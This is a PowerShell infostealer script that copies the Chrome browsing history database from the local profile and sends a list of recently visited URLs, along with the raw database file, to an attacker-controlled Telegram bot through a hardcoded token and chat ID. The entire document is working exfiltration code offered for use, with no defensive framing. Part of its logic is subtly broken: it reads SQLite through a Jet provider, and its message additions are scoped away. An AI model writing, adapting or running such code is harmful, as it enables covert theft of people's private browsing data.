# En9mm - Advanced Browser Data Extractor to Telegram

# Telegram Configuration
$Token  = "7921423137:AAHj4kDraZc0BRPk6c6j7TC2vJE5Dy-6j0g"
$ChatID = "774651165"
$Message = "📡 *Browser History Report*\n"

function Send-TelegramMessage($msg) {
    $uri = "https://api.telegram.org/bot$Token/sendMessage"
    Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body (@{
        chat_id = $ChatID
        text = $msg
        parse_mode = "Markdown"
    } | ConvertTo-Json)
}

function Extract-ChromeHistory {
    $chromeDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    if (Test-Path $chromeDB) {
        $temp = "$env:TEMP\history_chrome.db"
        Copy-Item $chromeDB $temp -Force
        $cn = New-Object -ComObject ADODB.Connection
        $cn.Open("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=$temp;Extended Properties='';")
        $rs = New-Object -ComObject ADODB.Recordset
        $query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10"
        try {
            $rs.Open($query, $cn)
            $i = 1
            while (!$rs.EOF) {
                $url = $rs.Fields.Item("url").Value
                $title = $rs.Fields.Item("title").Value
                $Message += "`n`$i`. [$title]($url)"
                $rs.MoveNext(); $i++
            }
            $rs.Close(); $cn.Close()
        } catch {
            $Message += "`n❌ *Failed to read Chrome history*"
        }
    } else {
        $Message += "`n⚠️ *Chrome history file not found*"
    }
}

function Send-File($filepath, $caption) {
    $uri = "https://api.telegram.org/bot$Token/sendDocument"
    $form = @{
        chat_id = $ChatID
        caption = $caption
        document = Get-Item $filepath
    }
    Invoke-RestMethod -Uri $uri -Method Post -Form $form
}

# Run extraction
Extract-ChromeHistory
Send-TelegramMessage $Message

# Send raw Chrome DB file (optional)
$chromeDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
if (Test-Path $chromeDB) {
    Copy-Item $chromeDB "$env:TEMP\chrome_raw.db" -Force
    Send-File "$env:TEMP\chrome_raw.db" "📁 Raw Chrome History File"
}
